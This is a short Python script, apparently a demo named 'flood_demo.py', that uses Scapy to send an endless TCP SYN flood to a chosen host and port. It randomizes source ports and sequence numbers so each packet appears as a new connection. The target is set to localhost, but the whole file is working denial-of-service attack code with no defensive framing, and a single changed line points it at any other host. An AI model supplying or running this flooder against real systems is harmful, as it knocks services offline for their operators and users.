# save as flood_demo.py — run with: sudo python3 flood_demo.py
from scapy.all import *
import time

target = "127.0.0.1"
port   = 80

print(f"[*] Starting SYN flood → {target}:{port}")
print("[*] Press Ctrl+C to stop\n")

count = 0
start = time.time()

while True:
    # Randomize source port so each looks like a new flow
    pkt = IP(dst=target) / TCP(
        sport=RandShort(),
        dport=port,
        flags="S",
        seq=RandInt()
    )
    send(pkt, verbose=False, count=50)
    count += 50
    elapsed = time.time() - start
    print(f"\r  Sent {count} packets  |  {count/elapsed:.0f} pkt/s", end="", flush=True)